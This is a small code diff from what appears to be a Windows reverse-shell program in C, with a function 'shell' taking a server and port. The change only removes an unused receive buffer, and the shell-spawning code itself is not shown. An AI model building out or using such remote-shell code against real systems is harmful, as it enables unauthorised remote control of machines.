@@ -36,10 +36,6 @@ int shell(LPWSTR server, unsigned int port) {
         WSACleanup();
         return -1;
     }
-
-    // Setup buffer
-    char recvbuf[BUFLEN];
-    memset(recvbuf, 0, BUFLEN);
     
     // Start shell
     //* https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
